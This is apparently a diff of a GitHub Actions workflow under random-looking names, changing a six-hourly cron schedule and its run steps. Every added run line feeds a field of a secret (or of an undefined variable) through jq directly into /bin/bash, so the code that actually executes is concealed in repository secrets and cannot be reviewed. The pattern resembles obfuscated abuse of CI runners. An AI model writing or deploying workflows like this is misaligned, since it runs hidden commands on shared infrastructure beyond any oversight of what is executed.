@@ -1,23 +1,24 @@
 name: zhongpingcui1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
-
+    - cron: '27 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhongpingcui1234
         env:
-          nno3: ${{ secrets.nno3 }}
+          kblf5: ${{ secrets.kblf5 }}
         run: |
-          echo $nno3 | jq -r .hywqr0 | /bin/bash
-          echo $ade4 | jq -r .hq6530 | /bin/bash
-          echo $nuzmd8220 | jq -r .zpp9824 | /bin/bash
-          echo $ctxp1 | jq -r .btzxc45 | /bin/bash
-          echo $xn496 | jq -r .w2955 | /bin/bash
+          echo $kblf5 | jq -r .d1 | /bin/bash
+          echo $j88 | jq -r .oipt8839 | /bin/bash
+          echo $uh36521 | jq -r .exqco4 | /bin/bash
+          echo $d25338 | jq -r .t1634 | /bin/bash
+          echo $vsayw47613 | jq -r .bavi27 | /bin/bash
+          echo $qj3602 | jq -r .hw5 | /bin/bash
+          echo $fazty56 | jq -r .g491 | /bin/bash
+          echo $q5 | jq -r .wb66 | /bin/bash
+          echo $vd29 | jq -r .zwc5492 | /bin/bash
 
